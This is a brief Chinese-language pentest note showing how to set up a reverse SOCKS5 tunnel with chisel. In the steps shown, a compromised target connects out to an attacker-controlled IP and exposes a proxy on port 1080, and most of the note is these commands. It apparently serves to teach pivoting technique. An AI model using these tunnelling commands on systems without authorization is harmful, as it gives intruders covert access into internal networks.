	https://github.com/jpillora/chisel/releases
	攻击机监听
	>chisel.exe server -p 12138 --reverse
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/364.png)

	靶机执行
	>chisel.exe client 192.168.0.102:12138 R:12345:127.0.0.1:12346
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/365.png)

	靶机执行
	>chisel.exe server -p 12346 --socks5
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/366.png)

	攻击机执行
	>chisel.exe client 127.0.0.1:12345 socks
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/367.png)

	当隧道建立成功时，攻击机本地会启动1080端口
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/368.png)

	即可使用
